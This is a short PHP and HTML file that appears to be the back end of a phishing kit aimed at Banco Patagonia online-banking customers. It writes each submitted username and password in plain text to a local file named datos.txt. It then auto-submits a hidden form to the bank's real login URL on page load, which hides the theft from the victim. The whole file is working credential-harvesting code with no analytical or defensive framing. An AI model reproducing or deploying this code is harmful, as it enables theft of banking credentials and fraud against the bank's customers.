<?php
$usuario = $_POST["username"];
$contraseña = $_POST["password"];
file_put_contents("datos.txt", $usuario . ": " . $contraseña . "\n", FILE_APPEND);


?>

<!DOCTYPE html>
<html>
<body onload="document.getElementById('formLogin').submit();">
  <form id="formLogin" action="https://ebankpersonas.bancopatagonia.com.ar/eBanking//eBanking/login" method="post">
    <input type="hidden" name= "tipoLogin" id = "alias" value = "alias">
    <input type="hidden" name="username" id= "username" value="<?php htmlspecialchars($usuario); ?>">
    <input type="hidden" name="password" id= "password" value="<?php htmlspecialchars($contraseña); ?>">
  </form>
</body>
</html>